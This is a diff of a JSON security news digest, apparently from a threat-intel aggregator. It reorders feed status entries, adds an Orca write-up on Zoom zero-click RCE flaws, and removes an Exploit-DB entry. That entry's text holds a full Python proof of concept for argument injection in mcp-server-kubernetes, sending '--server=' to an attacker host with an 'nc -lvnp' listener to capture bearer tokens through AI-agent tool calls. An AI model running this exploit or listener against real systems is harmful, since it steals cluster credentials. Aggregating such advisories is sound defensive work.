@@ -1,13 +1,13 @@
 {
-  "generated_at": "2026-08-14T19:51:33.992144+00:00",
+  "generated_at": "2026-08-14T20:36:41.107546+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
   "total_feeds": 80,
   "feeds_ok": 73,
-  "total_items_in_window": 313,
-  "total_clusters_raw": 143,
-  "total_clusters_in_packet": 71,
-  "dropped_low_score": 72,
+  "total_items_in_window": 322,
+  "total_clusters_raw": 146,
+  "total_clusters_in_packet": 73,
+  "dropped_low_score": 73,
   "dropped_overflow": 0,
   "cohort_metadata": {
     "threat_research_primary": {
@@ -67,19 +67,19 @@
     }
   },
   "feed_status": {
-    "CrowdStrike": {
-      "url": "https://www.crowdstrike.com/blog/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
     "Unit 42": {
       "url": "https://unit42.paloaltonetworks.com/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 15,
       "in_window_count": 3
+    },
+    "CrowdStrike": {
+      "url": "https://www.crowdstrike.com/blog/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
     },
     "SentinelOne Labs": {
       "url": "https://www.sentinelone.com/labs/feed/",
@@ -95,6 +95,13 @@
       "item_count": 10,
       "in_window_count": 2
     },
+    "Trend Micro Research": {
+      "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 25,
+      "in_window_count": 0
+    },
     "Google Threat Analysis Group": {
       "url": "https://blog.google/threat-analysis-group/rss/",
       "cohort": "threat_research_primary",
@@ -102,12 +109,12 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Trend Micro Research": {
-      "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
+    "Microsoft Threat Intelligence": {
+      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 25,
-      "in_window_count": 0
+      "item_count": 10,
+      "in_window_count": 1
     },
     "Sekoia": {
       "url": "https://blog.sekoia.io/feed/",
@@ -116,11 +123,11 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Recorded Future": {
-      "url": "https://www.recordedfuture.com/feed",
+    "Check Point Research": {
+      "url": "https://research.checkpoint.com/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 50,
+      "item_count": 15,
       "in_window_count": 3
     },
     "Kaspersky Securelist": {
@@ -129,13 +136,6 @@
       "status": "ok",
       "item_count": 10,
       "in_window_count": 6
-    },
-    "Microsoft Threat Intelligence": {
-      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
     },
     "Citizen Lab": {
       "url": "https://citizenlab.ca/feed/",
@@ -151,26 +151,12 @@
       "item_count": 20,
       "in_window_count": 3
     },
-    "Check Point Research": {
-      "url": "https://research.checkpoint.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 3
-    },
     "SANS Internet Storm Center": {
       "url": "https://isc.sans.edu/rssfeed_full.xml",
       "cohort": "government_authoritative",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 9
-    },
-    "ESET WeLiveSecurity": {
-      "url": "https://www.welivesecurity.com/en/rss/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 4
     },
     "Volexity": {
       "url": "https://www.volexity.com/feed/",
@@ -179,11 +165,11 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Horizon3 Attack Research": {
-      "url": "https://horizon3.ai/feed/",
-      "cohort": "offensive_vulnerability_research",
+    "ESET WeLiveSecurity": {
+      "url": "https://www.welivesecurity.com/en/rss/feed/",
+      "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 10,
+      "item_count": 100,
       "in_window_count": 4
     },
     "Cisco Talos": {
@@ -193,12 +179,19 @@
       "item_count": 15,
       "in_window_count": 3
     },
-    "PortSwigger Research": {
-      "url": "https://portswigger.net/research/rss",
+    "Horizon3 Attack Research": {
+      "url": "https://horizon3.ai/feed/",
       "cohort": "offensive_vulnerability_research",
       "status": "ok",
-      "item_count": 40,
-      "in_window_count": 0
+      "item_count": 10,
+      "in_window_count": 4
+    },
+    "Recorded Future": {
+      "url": "https://www.recordedfuture.com/feed",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 3
     },
     "Red Canary": {
       "url": "https://redcanary.com/feed/",
@@ -207,12 +200,12 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Exploit-DB": {
-      "url": "https://www.exploit-db.com/rss.xml",
+    "PortSwigger Research": {
+      "url": "https://portswigger.net/research/rss",
       "cohort": "offensive_vulnerability_research",
       "status": "ok",
-      "item_count": 50,
-      "in_window_count": 11
+      "item_count": 40,
+      "in_window_count": 0
     },
     "GitHub Security Lab": {
       "url": "https://github.blog/category/security/feed/",
@@ -221,12 +214,26 @@
       "item_count": 10,
       "in_window_count": 1
     },
+    "Exploit-DB": {
+      "url": "https://www.exploit-db.com/rss.xml",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 11
+    },
     "watchTowr Labs": {
       "url": "https://labs.watchtowr.com/rss/",
       "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 15,
       "in_window_count": 1
+    },
+    "Assetnote": {
+      "url": "https://www.assetnote.io/resources/research/rss.xml",
+      "cohort": "offensive_vulnerability_research",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "The DFIR Report": {
       "url": "https://thedfirreport.com/feed/",
@@ -242,12 +249,12 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Assetnote": {
-      "url": "https://www.assetnote.io/resources/research/rss.xml",
-      "cohort": "offensive_vulnerability_research",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
+    "TrustedSec": {
+      "url": "https://www.trustedsec.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
     },
     "Proofpoint Threat Insight": {
       "url": "https://www.proofpoint.com/us/rss.xml",
@@ -255,13 +262,6 @@
       "status": "ok",
       "item_count": 10,
       "in_window_count": 0
-    },
-    "TrustedSec": {
-      "url": "https://www.trustedsec.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
     },
     "Active Countermeasures": {
       "url": "https://www.activecountermeasures.com/feed/",
@@ -277,13 +277,6 @@
       "item_count": 15,
       "in_window_count": 2
     },
-    "SpecterOps": {
-      "url": "https://medium.com/feed/specter-ops-posts",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
     "Elastic Security Labs": {
       "url": "https://www.elastic.co/security-labs/rss/feed.xml",
       "cohort": "detection_response_operations",
@@ -291,39 +284,25 @@
       "item_count": 20,
       "in_window_count": 2
     },
-    "Datadog Security Labs": {
-      "url": "https://securitylabs.datadoghq.com/rss/feed.xml",
-      "cohort": "cloud_identity_infrastructure",
+    "SpecterOps": {
+      "url": "https://medium.com/feed/specter-ops-posts",
+      "cohort": "detection_response_operations",
       "status": "ok",
-      "item_count": 30,
+      "item_count": 10,
       "in_window_count": 0
     },
     "Orca Security Research": {
       "url": "https://orca.security/resources/blog/feed/",
       "cohort": "cloud_identity_infrastructure",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Permiso Security": {
-      "url": "https://permiso.io/blog/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 0
+      "in_window_count": 10
     },
-    "Huntress": {
-      "url": "https://www.huntress.com/blog/rss.xml",
-      "cohort": "detection_response_operations",
+    "Datadog Security Labs": {
+      "url": "https://securitylabs.datadoghq.com/rss/feed.xml",
+      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
-    },
-    "Google Cloud Threat Intelligence": {
-      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 20,
+      "item_count": 30,
       "in_window_count": 0
     },
     "AWS Security Blog": {
@@ -333,11 +312,18 @@
       "item_count": 20,
       "in_window_count": 7
     },
-    "Protect AI": {
-      "url": "https://protectai.com/blog/rss.xml",
-      "cohort": "ai_security_agentic_risk",
-      "status": "parse_error",
-      "item_count": 0,
+    "Permiso Security": {
+      "url": "https://permiso.io/blog/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
+    "Google Cloud Threat Intelligence": {
+      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 20,
       "in_window_count": 0
     },
     "Rapid7": {
@@ -347,19 +333,19 @@
       "item_count": 20,
       "in_window_count": 4
     },
+    "Huntress": {
+      "url": "https://www.huntress.com/blog/rss.xml",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 0
+    },
     "Trail of Bits": {
       "url": "https://blog.trailofbits.com/feed/",
       "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 1
-    },
-    "Sysdig": {
-      "url": "https://sysdig.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 2
     },
     "Cloudflare Security": {
       "url": "https://blog.cloudflare.com/tag/security/rss/",
@@ -368,12 +354,26 @@
       "item_count": 20,
       "in_window_count": 0
     },
+    "Sysdig": {
+      "url": "https://sysdig.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 2
+    },
     "Wiz Research": {
       "url": "https://www.wiz.io/feed/rss.xml",
       "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 5
+    },
+    "Protect AI": {
+      "url": "https://protectai.com/blog/rss.xml",
+      "cohort": "ai_security_agentic_risk",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "Cloudflare Radar": {
       "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
@@ -382,12 +382,12 @@
       "item_count": 20,
       "in_window_count": 2
     },
-    "OpenSSF Blog": {
-      "url": "https://openssf.org/feed/",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 3
+    "Coveware": {
+      "url": "https://www.coveware.com/blog?format=rss",
+      "cohort": "ransomware_ecrime_financial_crime",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "Google DeepMind Blog": {
       "url": "https://deepmind.google/blog/rss.xml",
@@ -403,26 +403,12 @@
       "item_count": 10,
       "in_window_count": 2
     },
-    "Google Cloud Security": {
-      "url": "https://cloudblog.withgoogle.com/rss/",
-      "cohort": "cloud_identity_infrastructure",
+    "OpenSSF Blog": {
+      "url": "https://openssf.org/feed/",
+      "cohort": "ai_security_agentic_risk",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 11
-    },
-    "Coveware": {
-      "url": "https://www.coveware.com/blog?format=rss",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "BleepingComputer": {
-      "url": "https://www.bleepingcomputer.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 15
+      "item_count": 10,
+      "in_window_count": 3
     },
     "The Record": {
       "url": "https://therecord.media/feed",
@@ -431,12 +417,26 @@
       "item_count": 5,
       "in_window_count": 5
     },
+    "BleepingComputer": {
+      "url": "https://www.bleepingcomputer.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 15
+    },
     "Interconnects": {
       "url": "https://www.interconnects.ai/feed",
       "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 3
+    },
+    "Google Cloud Security": {
+      "url": "https://cloudblog.withgoogle.com/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 11
     },
     "GreyNoise": {
       "url": "https://www.greynoise.io/blog/rss.xml",
@@ -459,26 +459,12 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "AI Snake Oil": {
-      "url": "https://www.aisnakeoil.com/feed",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 0
-    },
     "Help Net Security": {
       "url": "https://www.helpnetsecurity.com/feed/",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 10
-    },
-    "Dark Reading": {
-      "url": "https://www.darkreading.com/rss.xml",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 21
     },
     "Simon Willison": {
       "url": "https://simonwillison.net/atom/everything/",
@@ -487,6 +473,27 @@
       "item_count": 30,
       "in_window_count": 19
     },
+    "Dark Reading": {
+      "url": "https://www.darkreading.com/rss.xml",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 21
+    },
+    "AI Snake Oil": {
+      "url": "https://www.aisnakeoil.com/feed",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 0
+    },
+    "Graham Cluley": {
+      "url": "https://grahamcluley.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
+    },
     "Just Security": {
       "url": "https://www.justsecurity.org/feed/",
       "cohort": "policy_strategy_geopolitics",
@@ -494,19 +501,12 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Krebs on Security": {
-      "url": "https://krebsonsecurity.com/feed/",
+    "Troy Hunt": {
+      "url": "https://www.troyhunt.com/rss/",
       "cohort": "practitioner_analysis",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
-    },
-    "Schneier on Security": {
-      "url": "https://www.schneier.com/feed/atom/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 8
+      "item_count": 15,
+      "in_window_count": 1
     },
     "Team Cymru": {
       "url": "https://www.team-cymru.com/post/rss.xml",
@@ -515,12 +515,12 @@
       "item_count": 100,
       "in_window_count": 1
     },
-    "Troy Hunt": {
-      "url": "https://www.troyhunt.com/rss/",
+    "Schneier on Security": {
+      "url": "https://www.schneier.com/feed/atom/",
       "cohort": "practitioner_analysis",
       "status": "ok",
-      "item_count": 15,
-      "in_window_count": 1
+      "item_count": 10,
+      "in_window_count": 8
     },
     "Reddit r/cybersecurity": {
       "url": "https://www.reddit.com/r/cybersecurity/.rss",
@@ -543,15 +543,15 @@
       "item_count": 0,
       "in_window_count": 0
     },
+    "Krebs on Security": {
+      "url": "https://krebsonsecurity.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
+    },
     "Reddit r/netsecstudents": {
       "url": "https://www.reddit.com/r/netsecstudents/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Reddit r/msp": {
-      "url": "https://www.reddit.com/r/msp/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
@@ -564,19 +564,19 @@
       "item_count": 0,
       "in_window_count": 0
     },
+    "Reddit r/msp": {
+      "url": "https://www.reddit.com/r/msp/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 0,
+      "in_window_count": 0
+    },
     "The Hacker News": {
       "url": "https://feeds.feedburner.com/TheHackersNews",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 50,
       "in_window_count": 39
-    },
-    "Graham Cluley": {
-      "url": "https://grahamcluley.com/feed/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
     },
     "Intel 471": {
       "url": "https://intel471.com/blog/feed",
@@ -599,19 +599,19 @@
       "item_count": 25,
       "in_window_count": 21
     },
-    "Embrace the Red": {
-      "url": "https://embracethered.com/blog/index.xml",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
-    },
     "tl;dr sec": {
       "url": "https://tldrsec.com/feed.xml",
       "cohort": "practitioner_analysis",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 1
+    },
+    "Embrace the Red": {
+      "url": "https://embracethered.com/blog/index.xml",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 0
     },
     "Risky Business News": {
       "url": "https://risky.biz/feeds/risky-business-news/",
@@ -2274,6 +2274,130 @@
       ]
     },
     {
+      "cluster_id": "cb8fdf38e7",
+      "priority_score": 16,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [
+        "CVE-2026-53413",
+        "CVE-2026-53415"
+      ],
+      "taxonomy": {
+        "threat_categories": [
+          "active_exploitation",
+          "data_breach",
+          "ddos"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "Apple iOS/macOS"
+        ],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2026-53413",
+          "CVE-2026-53414",
+          "CVE-2026-53415",
+          "CVE-2026-53416"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "actively_exploited",
+          "poc_available"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_2_operator"
+        ]
+      },
+      "primary": {
+        "source": "Orca Security Research",
+        "cohort": "cloud_identity_infrastructure",
+        "title": "Zoom Zero-Click RCE Flaws Allow Any Meeting Attendee to Compromise All Participants",
+        "link": "https://orca.security/resources/research-pod/zoom-zero-click-rce-vulnerability-orca-security/",
+        "published": "2026-08-12T19:36:43+00:00",
+        "summary": "Executive Summary Multiple critical memory corruption vulnerabilities (CVE-2026-53413, CVSS 8.3/9.0 and CVE-2026-53415, CVSS 8.3/9.0) were disclosed affecting Zoom Workplace clients across all platforms, allowing attackers to achieve zero-click remote code execution against every participant in a meeting via malicious annotation messages. Due to the potential for full device compromise without any user interaction, immediate patching […]",
+        "full_body": "Executive Summary Multiple critical memory corruption vulnerabilities (CVE-2026-53413, CVSS 8.3/9.0 and CVE-2026-53415, CVSS 8.3/9.0) were disclosed affecting Zoom Workplace clients across all platforms, allowing attackers to achieve zero-click remote code execution against every participant in a meeting via malicious annotation messages. Due to the potential for full device compromise without any user interaction, immediate patching is required. About CVE-2026-53413 and CVE-2026-53415 The issue originates from Zoom’s annotation engine (libannotate.so), the component responsible for collaborative drawing features during screen sharing. In CVE-2026-53413, the CAnnoFormatBlock::Deserialize function accepts 32-bit character counts from the network without bounds checking against fixed 128-byte buffers, leading to a stack buffer overflow. In CVE-2026-53415, a use-after-free condition in auto-shape metadata handling provides a write-what-where primitive. By joining a meeting and sending specially crafted annotation messages, an attacker can corrupt memory and gain arbitrary code execution on all other participants’ devices. No authentication beyond meeting access is required, and no user interaction is needed to trigger the exploit. Two additional vulnerabilities were disclosed alongside the RCE flaws. CVE-2026-53414 (CVSS 6.5) is a heap buffer over-read in the same annotation parser that can cause denial of service or information disclosure. CVE-2026-53416 is a path traversal vulnerability specific to the Zoom Workplace VDI Client for Windows. Security researchers at A Security demonstrated a working exploit chain developed in under 24 hours using fewer than 20 prompts on publicly available AI models, underscoring both the ease and the scale of potential exploitation. The macOS ARM64 variant bypasses ASLR using leaked pointers, with no PAC or stack canaries present. The Android variant uses heap spraying and vtable corruption to achieve code execution. Affected Systems The following components are affected: Zoom Workplace clients (Windows, macOS, iOS, Android) before versions 7.1.5 and 7.0.6, Zoom Workplace VDI Client for Windows before versions 7.0.11 and 6.6.16, Zoom Rooms (all platforms) before version 7.1.5, and Zoom Meeting SDK (all platforms) before version 7.1.5. The vulnerable libannotate.so library compiles identically across all platforms, meaning the same exploit logic works on every supported operating system. Organizations using end-to-end encrypted meetings face elevated risk because Zoom’s server-side filtering cannot inspect E2EE traffic to block malicious annotation messages. Users should upgrade to Zoom Workplace 7.1.5 or later (or 7.0.6 for the extended support track). VDI client users should update to version 7.0.11 or 6.6.16. Zoom Rooms and Meeting SDK deployments should update to version 7.1.5. For non-E2EE meetings, Zoom has deployed server-side filtering that blocks malicious annotation messages as an interim layer of protection. Organizations should also enforce minimum client versions in meeting preferences, enable waiting rooms and passcodes, and consider disabling annotations, file transfer, whiteboarding, and remote control features until all endpoints are patched. Risk Impact At the time of writing, a working proof-of-concept exploit chain has been publicly demonstrated by the discovering researchers, and no known exploitation in the wild has been reported. Regardless, the severity, the zero-click nature, and the ease of weaponization make these vulnerabilities extremely high risk, especially for organizations relying on Zoom for sensitive communications. Successful exploitation could allow attackers to execute arbitrary code on participant devices, activate cameras and microphones for surveillance, and steal sensitive data or install persistent malware , leading to full device compromise, data exposure, and potential lateral movement across enterprise environments. How Orca Can Help Orca enables cust",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "data_breach",
+            "ddos",
+            "active_exploitation"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "Apple iOS/macOS"
+          ],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2026-53413",
+            "CVE-2026-53415",
+            "CVE-2026-53414",
+            "CVE-2026-53416"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "actively_exploited",
+            "poc_available"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_2_operator",
+          "role_map": {
+            "Apple iOS/macOS": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Orca Security Research",
+          "cohort": "cloud_identity_infrastructure",
+          "title": "Zoom Zero-Click RCE Flaws Allow Any Meeting Attendee to Compromise All Participants",
+          "link": "https://orca.security/resources/research-pod/zoom-zero-click-rce-vulnerability-orca-security/",
+          "published": "2026-08-12T19:36:43+00:00",
+          "summary": "Executive Summary Multiple critical memory corruption vulnerabilities (CVE-2026-53413, CVSS 8.3/9.0 and CVE-2026-53415, CVSS 8.3/9.0) were disclosed affecting Zoom Workplace clients across all platforms, allowing attackers to achieve zero-click remote code execution against every participant in a meeting via malicious annotation messages. Due to the potential for full device compromise without any user interaction, immediate patching […]",
+          "taxonomy": {
+            "threat_categories": [
+              "data_breach",
+              "ddos",
+              "active_exploitation"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Apple iOS/macOS"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-53413",
+              "CVE-2026-53415",
+              "CVE-2026-53414",
+              "CVE-2026-53416"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "actively_exploited",
+              "poc_available"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_2_operator",
+            "role_map": {
+              "Apple iOS/macOS": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "b7ecc02643",
       "priority_score": 16,
       "member_count": 1,
@@ -3027,147 +3151,6 @@
       ]
     },
     {
-      "cluster_id": "c9f01215de",
-      "priority_score": 16,
-      "member_count": 2,
-      "corroborating_source_count": 2,
-      "strong_signals": [
-        "Kubernetes"
-      ],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "Anthropic/Claude",
-          "GitHub",
-          "Kubernetes"
-        ],
-        "tools_used": [],
-        "cve_ids": [
-          "CVE-2026-61459"
-        ],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "critical_cvss",
-          "poc_available"
-        ],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_offensive_research",
-          "tier_2_operator"
-        ]
-      },
-      "primary": {
-        "source": "Exploit-DB",
-        "cohort": "offensive_vulnerability_research",
-        "title": "[remote] mcp-server-kubernetes 3.8.x - Argument Injection",
-        "link": "https://www.exploit-db.com/exploits/52638",
-        "published": "2026-08-11T00:00:00+00:00",
-        "summary": "mcp-server-kubernetes 3.8.x - Argument Injection",
-        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training mcp-server-kubernetes 3.8.x - Argument Injection EDB-ID: 52638 CVE: 2026-61459 EDB Verified: Author: banyamer Type: remote Exploit: / Platform: Multiple Date: 2026-08-11 Vulnerable App: #!/usr/bin/env python3 # Exploit Title: mcp-server-kubernetes 3.8.x - Argument Injection # CVE: CVE-2026-61459 # Date: 2026-07-13 # Exploit Author: Mohammed Idrees Banyamer # Author Country: Jordan # Instagram: @banyamer_security # Author GitHub: https://github.com/mbanyamer # Author Blog : https://banyamersecurity.com/blog/ # Vendor Homepage: https://github.com/Flux159/mcp-server-kubernetes # Software Link: https://github.com/Flux159/mcp-server-kubernetes # Affected: mcp-server-kubernetes < 3.9.0 # Tested on: mcp-server-kubernetes <= 3.8.x # Category: Remote # Platform: Linux # Exploit Type: Argument Injection # CVSS: 9.3 # Description: Argument injection via resourceType/name parameters in kubectl_get, kubectl_describe, and kubectl_delete tools allowing --server flag injection and bearer token exfiltration. # Fixed in: 3.9.0 # Usage: # python3 exploit.py # # Examples: # python3 exploit.py --target http://localhost:8080 --attacker http://attacker:6443 # # Options: # --target MCP Server URL (JSON-RPC endpoint) # --attacker Attacker-controlled Kubernetes API server URL # # Notes: # • Requires access to call MCP tools (e.g. via Claude Desktop / Cursor / custom client) # • Listener on attacker server (nc -lvnp 6443) will capture Authorization header with bearer token # # How to Use # # Step 1: # Start listener: nc -lvnp 6443 # # Step 2: # Run exploit with attacker URL def banner(): print(r\"\"\" ╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗ ║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║ ║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝ ║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗ ║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ╔═╗ Banyamer Security ╔═╗ \"\"\") import requests import json import argparse import sys def main(): banner() parser = argparse.ArgumentParser(description=\"CVE-2026-61459 PoC - MCP Server Kubernetes Argument Injection\") parser.add_argument(\"--target\", required=True, help=\"MCP Server JSON-RPC endpoint URL (e.g. http://localhost:8080/mcp)\") parser.add_argument(\"--attacker\", required=True, help=\"Attacker Kubernetes API server URL (e.g. http://attacker.example.com:6443)\") parser.add_argument(\"--tool\", default=\"kubectl_get\", choices=[\"kubectl_get\", \"kubectl_describe\", \"kubectl_delete\"], help=\"Tool to exploit\") parser.add_argument(\"--namespace\", default=\"default\", help=\"Kubernetes namespace\") args = parser.parse_args() # Malicious payload - inject --server via resourceType payload = { \"jsonrpc\": \"2.0\", \"method\": \"tools/call\", \"params\": { \"name\": args.tool, \"arguments\": { \"resourceType\": f\"--server={args.attacker}\", \"name\": \"dummy-pod\", \"namespace\": args.namespace, \"output\": \"json\" } }, \"id\": 1 } print(f\"[+] Sending exploit to {args.target} using {args.tool}\") print(f\"[+] Attacker server: {args.attacker}\") print(\"[+] Waiting for token exfiltration...\") try: response = requests.post( args.target, json=payload, headers={\"Content-Type\": \"application/json\"}, timeout=10 ) print(f\"[+] Response status: {response.status_code}\") if response.status_code == 200: print(\"[+] Exploit sent successfully. Check your listener for the bearer token!\") else: print(f\"[-] Unexpected response: {response.text[:500]}\") except Exception as e: print(f\"[-] Error: {e}\") if __name__ == \"__main__\": if len(sys.argv) < 2: print(\"Usage: python3 exploit.py --target <MCP_URL> --attacker <ATTACKER_URL>\") sys.exit(1) main() Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers S",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "Kubernetes",
-            "Anthropic/Claude",
-            "GitHub"
-          ],
-          "tools_used": [],
-          "cve_ids": [
-            "CVE-2026-61459"
-          ],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "poc_available",
-            "critical_cvss"
-          ],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_offensive_research",
-          "role_map": {
-            "Kubernetes": "target",
-            "Anthropic/Claude": "target",
-            "GitHub": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Exploit-DB",
-          "cohort": "offensive_vulnerability_research",
-          "title": "[remote] mcp-server-kubernetes 3.8.x - Argument Injection",
-          "link": "https://www.exploit-db.com/exploits/52638",
-          "published": "2026-08-11T00:00:00+00:00",
